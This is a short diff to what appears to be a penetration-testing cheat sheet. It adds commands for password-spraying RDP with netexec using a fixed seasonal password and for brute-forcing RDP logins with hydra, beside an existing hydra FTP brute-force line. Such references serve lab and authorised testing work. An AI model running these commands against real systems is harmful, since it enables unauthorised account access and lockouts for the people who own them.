@@ -12,3 +12,13 @@ Null/same-as-user/reversed logins (cheap first pass)
 ```bash
 hydra -L users.txt -P pass.txt -e nsr -t 4 ftp://$ip
 ```
+
+RDP is slow to spray — prefer SMB/WinRM for cred validation, then use found creds here.
+Spray with netexec (lightweight check)
+```bash
+nxc rdp $ip -u users.txt -p 'Spring2026!' --continue-on-success
+```
+Brute force with hydra
+```bash
+hydra -L users.txt -P pass.txt rdp://$ip
+```
